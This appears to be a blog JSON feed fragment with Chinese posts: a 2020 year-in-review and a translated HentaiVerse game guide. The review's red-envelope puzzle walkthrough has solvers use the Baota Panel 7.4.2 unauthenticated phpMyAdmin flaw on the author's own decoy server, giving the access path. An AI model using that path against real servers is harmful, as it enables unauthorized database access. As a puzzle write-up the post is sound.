href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 